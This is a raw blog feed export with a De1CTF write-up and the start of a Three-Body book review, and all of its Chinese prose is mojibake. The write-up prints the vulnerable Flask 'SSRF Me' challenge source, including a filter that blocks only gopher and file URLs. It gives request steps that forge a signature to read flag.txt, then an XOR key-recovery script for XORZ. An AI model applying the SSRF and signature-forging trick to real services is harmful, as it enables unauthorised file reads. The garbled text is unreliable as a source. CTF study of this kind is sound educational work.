class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>å›æ˜¾flagçš„åœ°æ–¹åº”è¯¥æ˜¯Execå‡½æ•°ï¼Œç„¶åè¦å…ˆè¿‡ä¸€ä¸ªåˆ¤æ–­self.checkSign()</p><p>å®šä½åˆ°checkSignå‡½æ•°åˆæ˜¯ä¸€ä¸ªåˆ¤æ–­ if(getSign(self.action, self.param) == self.sign)</p><p>åœ¨å®šä½åˆ°getSignå‡½æ•°  return hashlib.md5(secert_key + param + action).hexdigest()</p><p>è¿™é‡Œä¼šæŠŠkeyï¼Œparamï¼Œactionä¸²èµ·æ¥ç„¶åmd5åŠ å¯†ï¼Œself.signæ˜¯cookieé‡Œçš„ï¼Œè¿™ä¸ªå¯ä»¥é€ ï¼Œå†è¯´ï¼Œç„¶åæ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>è¦æ±‚scanåœ¨actioné‡Œé¢ï¼Œè¿™æ ·å­ä»–ä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨scanä¸€ä¸ª{$param}æ–‡ä»¶ï¼Œå®šä½åˆ°scanå‡½æ•°ï¼Œ</p><p>return urllib.urlopen(param).read()[:50]ï¼Œä»–ä¼šæ‰“å¼€ä¸€ä¸ª{$param}æ–‡ä»¶å¹¶ä¸”åªå–å‰50ä½ï¼Œæ‰€ä»¥å°±æ‰“å¼€flag.txtå’¯ï¼Œ</p><p>patam=flag.txtï¼Œç„¶åä»–ä¼šæŠŠflag.txtçš„å†…å®¹å†™è¿›é‚£ä¸ªresultæ–‡ä»¶ã€‚æ¥ç€å¦‚æœreadåœ¨actioné‡Œé¢ï¼Œä»–å°±ä¼šæ‰“å¼€resultæ–‡ä»¶ï¼Œå¹¶æŠŠå†…å®¹èµ‹å€¼ç»™resultï¼Œç„¶åè¾“å‡ºï¼ˆå°±æ˜¯ç»™ä½ çœ‹å•¦ï¼‰ã€‚</p><p>é‚£ä¹ˆç›®çš„æ˜ç¡®äº†ï¼Œå¾€å‰æ¨å°±æ˜¯ï¼Œaction=readscanï¼Œç„¶åparam=flag.txtï¼Œé‚£ä¹ˆä¸ºäº†è¿‡æ£€æŸ¥ï¼Œsign=MD5(flag.txtreadscan)ï¼Œæ€ä¹ˆè·å¾—è¿™ä¸ªå‘¢ï¼Œæœ‰getsignè¿™ä¸ªå‡½æ•°ã€‚æ€ä¹ˆå›æ˜¾signå‘¢ï¼Ÿæœ‰geneSign()è¿™ä¸ªå‡½æ•°ï¼ŒgeneSignè¿™ä¸ªå‡½æ•°é‡Œçš„actionèµ‹å€¼ä¸ºscanäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©param=flag.txtrreadï¼Œå°±å¯ä»¥è·å¾—MD5(flag.txtreadscan)äº†ã€‚okayï¼Œä¸‡äº‹ä¿±å¤‡ã€‚é‚£æ€ä¹ˆæ‰§è¡Œåˆ°Exec()å‡½æ•°å‘¢ï¼Œåœ¨/De1taé‡Œçš„challenge()å‡½æ•°ï¼Œparamå¯ä»¥getã€‚actionå’Œsignéƒ½æ˜¯cookieé‡Œçš„ã€‚</p><p>æ‰€ä»¥æ€»çš„æ­¥éª¤ï¼š</p><ol><li>è®¿é—®/geneSign?param=flag.txtread                                  å¾—åˆ°$sign</li><li>è®¿é—®/De1ta?param=flag.txt                                                æŠ“åŒ…ï¼Œå†™å…¥sign=$signå’Œaction=readscan</li></ol><p>get flagã€‚</p><h3 id="XORZ"><a href="#XORZ" class="headerlink" title="XORZ"></a>XORZ</h3><p>åŠ å¯†æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> data <span class="keyword">import</span> flag,plain</span><br><span class="line"></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key&lt;<span class="number">38</span>))</span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure><p>è§£é¢˜æ€è·¯:</p><p>åŠ å¯†è„šæœ¬æ˜¯salt^key^plain=output</p><p>æ‰€ä»¥é€†è¿‡æ¥ï¼Œsalt^output=key^plain</p><p>å·²çŸ¥len(key)&lt;38ï¼Œ</p><p>æ‰€ä»¥å…ˆçˆ†ç ´é•¿åº¦ï¼Œ</p><p>åªè¦å¤‡é€‰çš„keyä¸æ˜¯ç©ºé›†å³å¯ï¼Œ</p><p>å¾—åˆ°å¯èƒ½çš„é•¿åº¦åªæœ‰30</p><p>ç„¶åå°±å¯ä»¥åˆ—å‡ºkeyçš„æ¯ä¸€ä½çš„å¯èƒ½å€¼</p><p>å…ˆéšä¾¿é€‰ä¸€ç»„keyå¼‚æˆ–ï¼Œç„¶åå¾—åˆ°åŸæ–‡æ˜¯èç¿14è¡Œè¯—</p><p>æ ¹æ®åŸæ–‡è°ƒæ•´keyå³å¯ã€‚</p><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ps=<span class="string">'1234567890qwertyuiopasdfghjklxcvbnmQWERTYUIOPSDFGHJKLZXCVBNM\'` ;,.'</span></span><br><span class="line">ks=<span class="string">'1234567890qwertyuiopasdfghjklxcvbnmQWERTYUIOPSDFGHJKLZXCVBNM'</span></span><br><span class="line">res=<span class="string">'1e5d4c055104471c6f234f5501555b5a014e5d001c2a54470555064c443e235b4c0e590356542a130a4242335a47551a590a136f1d5d4d440b0956773613180b5f184015210e4f541c075a47064e5f001e2a4f711844430c473e2413011a100556153d1e4f45061441151901470a196f035b0c4443185b322e130806431d5a072a46385901555c5b550a541c1a2600564d5f054c453e32444c0a434d43182a0b1c540a55415a550a5e1b0f613a5c1f10021e56773a5a0206100852063c4a18581a1d15411d17111b052113460850104c472239564c0755015a13271e0a55553b5a47551a54010e2a06130b5506005a393013180c100f52072a4a1b5e1b165d50064e411d0521111f235f114c47362447094f10035c066f19025402191915110b4206182a544702100109133e394505175509671b6f0b01484e06505b061b50034a2911521e44431b5a233f13180b5508131523050154403740415503484f0c2602564d470a18407b775d031110004a54290319544e06505b060b424f092e1a770443101952333213030d554d551b2006064206555d50141c454f0c3d1b5e4d43061e453e39544c17580856581802001102105443101d111a043c03521455074c473f3213000a5b085d113c194f5e08555415180f5f433e270d131d420c1957773f560d11440d40543c060e470b55545b114e470e193c155f4d47110947343f13180c100f565a000403484e184c15050250081f2a54470545104c5536251325435302461a3b4a02484e12545c1b4265070b3b5440055543185b36231301025b084054220f4f42071b1554020f430b196f19564d4002055d79'</span><span class="comment">#res=salt^output</span></span><br><span class="line">trlen= int(len(res)/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">list1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(res),<span class="number">2</span>):</span><br><span class="line">    list1.append(res[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">list2=[]                 <span class="comment">#åˆ—å‡ºkeyå…¨é›†</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,trlen):</span><br><span class="line"></span><br><span class="line">    list3=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ks:</span><br><span class="line">        <span class="keyword">if</span> (chr(ord(i)^int(list1[j],<span class="number">16</span>))<span class="keyword">in</span> ps):</span><br><span class="line">            list3.append(i)</span><br><span class="line">    list2.append(list3)             </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">                                      </span><br><span class="line"></span><br><span class="line">                     </span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">38</span>):          <span class="comment">#æ ¹æ®key[0]ä¸ä¸ºç©ºé›†æ¥çˆ†length</span></span><br><span class="line">    x=set(list2[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,trlen,length):</span><br><span class="line">        x &amp;= set(list2[j])</span><br><span class="line">    <span class="keyword">if</span> len(x)!=<span class="number">0</span>:</span><br><span class="line">        print(length)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">30</span>):          <span class="comment">#çˆ†keyå€™é€‰é›†</span></span><br><span class="line">    x=set(list2[z]) </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(z,trlen,<span class="number">30</span>):</span><br><span class="line">        x &amp;= set(list2[j])</span><br><span class="line">    <span class="keyword">if</span> len(x)!=<span class="number">0</span>:</span><br><span class="line">        y.append(x)</span><br><span class="line">print(str(y).replace(<span class="string">"&#125;,"</span>,<span class="string">"&#125;,\n"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key=<span class="string">'W3lc0m3tOjo1nu55un1ojOt3m0cl3W'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ki=cycle(key)           <span class="comment">#çœ‹ç»“æœ</span></span><br><span class="line">str1=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">    str1+=chr(ord(next(ki))^int(each,<span class="number">16</span>))</span><br><span class="line">print(str1)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸‰ä½“</title>
      <link href="/2019/08/02/%E4%B8%89%E4%BD%93/"/>
      <url>/2019/08/02/%E4%B8%89%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸‰ä½“"><a href="#ä¸‰ä½“" class="headerlink" title="ä¸‰ä½“"></a>ä¸‰ä½“</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="https://i.loli.net/2020/04/30/xBa2G13zq4LgNuR.png" alt="ä¸‰ä½“"></p><p>è¿™ä¸ªæš‘å‡ï¼Œè¯»äº†ä¸‰ä½“ä¸€ä¹¦ã€‚</p><p>&emsp;&emsp;ç²—æµ…çš„ç”¨ä¸€å¥è¯æ¦‚æ‹¬ä¸‰ä½“è¿™å¥—ä¹¦ï¼Œä¸‰ä½“äººæƒ³è¦ä¾µç•¥åœ°çƒï¼Œäººç±»è·Ÿä»–ä¸«æ­»ç£•ã€‚</p><p>&emsp;&emsp;æ•…äº‹æƒ…èŠ‚è·Œå®•èµ·ä¼ï¼Œå‹¾äººå¿ƒå¼¦ï¼Œä½†ä¸‰ä½“ä»¤äººç€è¿·çš„åœ°æ–¹ï¼Œä¸å•å•åªæ˜¯å› ä¸ºä»–æœ‰ä¸€ä¸ªå¥½æ•…äº‹ï¼Œæ›´å¸å¼•äººçš„åœ°æ–¹ï¼Œæ˜¯ä»–è¿˜æ‹¥æœ‰å‘äººæ·±æ€çš„é­”åŠ›ã€‚</p><h3 id="ä¸‰ä½“-1"><a href="#ä¸‰ä½“-1" class="headerlink" title="ä¸‰ä½“"></a>ä¸‰ä½“</h3><p>&emsp;&emsp;æ•…äº‹æ˜¯ç”±ä¸‰ä½“äººå’Œäººç±»ä¸­ä¸¤ä¸ªé»˜é»˜æ— é—»çš„äººå¼•å‘çš„ã€‚åˆ†åˆ«æ˜¯ä¸‰ä½“äºº1379å·å’Œåœ°çƒäººå¶æ–‡æ´ã€‚æ•…äº‹å…ˆä»ä¸‰ä½“äººçš„åŸºæœ¬æƒ…å†µè¯´èµ·ã€‚ä¸‰ä½“äººå±…ä¸­åœ¨è·ç¦»åœ°çƒ4.3å…‰å¹´å¤–ï¼Œå’Œäººç±»æ˜¯éå¸¸è¿‘çš„é‚»å±…ã€‚ä»–ä»¬å±…ä½çš„æ˜Ÿçƒéå¸¸å‘ï¼Œå› ä¸ºå¼•åŠ›ä½œç”¨ï¼Œä¸‰ä½“æ˜Ÿçƒä¼šè¢«æ‹‰æ¥æ‹‰å»ï¼Œè¿™ä¼šå¯¼è‡´ï¼Œè¿™é¢—æ˜Ÿçƒæœ‰æ—¶å€™ç‰¹åˆ«å†·ï¼Œæœ‰æ—¶å€™ç‰¹åˆ«çƒ­ã€‚åªæœ‰åœ¨è·ç¦»åˆšåˆšå¥½çš„æ—¶å€™ï¼Œä¸‰ä½“æ–‡æ˜æ‰ä¼šè“¬å‹ƒå‘å±•ã€‚è¿˜æœ‰ä¸€ç§æç«¯çš„æƒ…å†µï¼Œè¿™é¢—æ˜Ÿçƒä¼šè¢«ä¸‰ä½“çš„å¼•åŠ›æ’•è£‚ï¼Œé‚£ä¹ˆä¸‰ä½“æ–‡æ˜å°±å½»åº•ç»“æŸäº†ã€‚ä¸‰ä½“äººæ‰€é¢ä¸´çš„é—®é¢˜ï¼Œä¾¿æ˜¯æ•°å­¦ä¸Šéå¸¸ç»å…¸çš„ä¸‰ä½“é—®é¢˜ï¼Œå°è¯´åå­—ä¹Ÿæ˜¯ç”±æ­¤è€Œæ¥ã€‚å› ä¸ºä¸‰ä½“é—®é¢˜ï¼Œä¸‰ä½“äººæ²¡æœ‰åŠæ³•å¯¹æœªæ¥è¿›è¡Œå‡†ç¡®çš„é¢„æµ‹ã€‚åƒå’±ä»¬äººç±»éƒ½ä¹ æƒ¯äº†ç¬¬äºŒå¤©æ—©ä¸Šå¤ªé˜³ä¼šå‡èµ·æ¥ï¼Œä½†ä¸‰ä½“äººå¯å°±æ²¡é‚£ä¹ˆå¥½å‘½ï¼Œç¬¬äºŒå¤©å¤ªé˜³æ˜¯å¦ä¼šå‡èµ·æ¥ï¼Œå“ªä¸ªä¸‰ä½“äººéƒ½ä¸çŸ¥é“ã€‚åœ¨è¿™ç§ç¯å¢ƒä¸‹ï¼Œä¸‰ä½“äººè¿˜è¿›åŒ–å‡ºäº†ä¸€ç§è„±æ°´çš„èƒ½åŠ›ï¼Œä»¥ä¾¿åœ¨æ¶åŠ£çš„ç¯å¢ƒä¸­ä¼‘çœ ï¼Œæ­£æ‰€è°“ç”Ÿäºå¿§æ‚£è€Œæ­»äºå®‰ä¹ï¼Œä¸‰ä½“äººç–¯ç‹‚çš„å‘å±•ç§‘æŠ€ï¼Œæƒ³æ‰¾åˆ°ä¸€ä¸ªé è°±çš„æ˜Ÿçƒï¼Œå°±åƒåœ°çƒé‚£æ ·ï¼Œå¯ä»¥åœ¨é‚£é‡Œç”Ÿæ´»ï¼Œå› æ­¤ä¸‰ä½“äººæŠ•å…¥äº†å¤§é‡çš„äººåŠ›ç‰©åŠ›ï¼Œå¤©å¤©ä»”ç»†ç›‘å¬å®‡å®™é‡Œçš„å„ç§ä¿¡å·ï¼Œä¸æƒ³æ”¾è¿‡ä¸€ä¸èƒ½æ‰¾åˆ°æ–°å®¶å›­çš„æœºä¼šã€‚</p><p>&emsp;&emsp;æ¥ä¸‹æ¥æ˜¯å¶æ–‡æ´ï¼Œå°±æ˜¯å¥¹æŠŠä¸‰ä½“äººå¼•è¿‡æ¥çš„ã€‚å¶æ–‡æ´æ˜¯ä¸€å¯¹ä¸­å›½ç§‘å­¦å®¶å¤«å¦»çš„å¥³å„¿ï¼Œå°æ—¥å­è¿‡å¾—å¾ˆå¹¸ç¦ã€‚ä½†å¥¹çš„çˆ¶äº²åœ¨æ–‡é©æœŸé—´ç”±äºä¸æ„¿æ„è¯´è°è®¤ç½ªï¼Œè¢«å››ä¸ªéƒ½æ˜¯ä¸­å­¦ç”Ÿçš„å¥³çº¢å«å…µï¼Œç”¨æ­¦è£…çš®å¸¦å½“ä¼—æŠ½æ‰“è‡´æ­»ï¼›æ¯äº²åœ¨æ–‡é©ä¸­ä¹Ÿç–¯äº†ã€‚åæ¥å¶æ–‡æ´åŠ å…¥äº†å»ºè®¾å…µå›¢ï¼Œå¥¹äº²çœ¼ç›®ç¹äº†è¿™ç¾¤äººçš„ç–¯ç‹‚ï¼Œå±±æ—è‰åŸéƒ½å˜æˆäº†è’æ¼ ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä»–è®¤è¯†äº†ä¸€ä½è®°è€…ï¼Œç™½æ²æ—ï¼ŒäºŒäººæˆä¸ºäº†çŸ¥å·±ã€‚åæ¥è¿™ä½çŸ¥å·±æƒ³è¦ç»™ä¸­å¤®å¯„ä¸€å°ä¿¡ï¼Œåæ˜ å»ºè®¾å…µå›¢ä¸æ˜¯åœ¨å»ºè®¾è€Œæ˜¯åœ¨æ¯åç¯å¢ƒã€‚å¶æ–‡æ´çœ‹äº†ä¿¡åå¤§åŠ 